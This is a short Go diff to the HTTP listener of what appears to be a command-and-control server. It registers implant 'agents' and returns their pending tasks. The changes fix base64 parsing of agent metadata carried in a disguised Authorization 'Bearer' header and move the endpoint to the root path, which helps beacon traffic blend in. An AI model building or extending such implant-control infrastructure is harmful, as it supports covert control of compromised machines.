@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"log"
 	"net/http"
+	"strings"
 	"sync"
 	"time"
 
@@ -23,8 +24,6 @@ type HttpListener struct {
 
 var listenersMap = make(map[string]*HttpListener)
 
-var agentService agents.AgentService = agents.NewService()
-
 func handleImplant(w http.ResponseWriter, r *http.Request) {
 	metadata, err := extractMetadata(r.Header)
 	if err != nil {
@@ -32,10 +31,12 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	agent := agentService.GetAgent(metadata.Id)
+	agent := agents.GetServiceInstance().GetAgent(metadata.Id)
 	if agent == nil {
+		log.Printf("New agent detected with metadata: %+v\n", metadata)
 		agent = agents.NewAgent(metadata)
-		agentService.AddAgent(agent)
+		agents.GetServiceInstance().AddAgent(agent)
+		log.Printf("Agent added successfully")
 	}
 
 	tasks := agent.GetPendingTasks()
@@ -50,11 +51,13 @@ func extractMetadata(headers http.Header) (*agents.AgentMetadata, error) {
 	}
 
 	encodedMetadata := encodedMetadataArr[0]
-	if len(encodedMetadata) < 7 {
+	if len(encodedMetadata) < 7 || !strings.HasPrefix(encodedMetadata, "Bearer ") {
 		return nil, fmt.Errorf("malformed authorization header")
 	}
 
-	decodedBytes, err := base64.StdEncoding.DecodeString(encodedMetadata[:7])
+	encodedData := encodedMetadata[7:]
+
+	decodedBytes, err := base64.StdEncoding.DecodeString(encodedData)
 	if err != nil {
 		return nil, fmt.Errorf("failed to decode base64: %v", err)
 	}
@@ -70,7 +73,7 @@ func extractMetadata(headers http.Header) (*agents.AgentMetadata, error) {
 
 func (s *HttpListener) Start() {
 	mux := http.NewServeMux()
-	mux.HandleFunc("/handleImplant", handleImplant)
+	mux.HandleFunc("/", handleImplant)
 
 	s.server = &http.Server{
 		Addr:    ":" + s.BindPort,
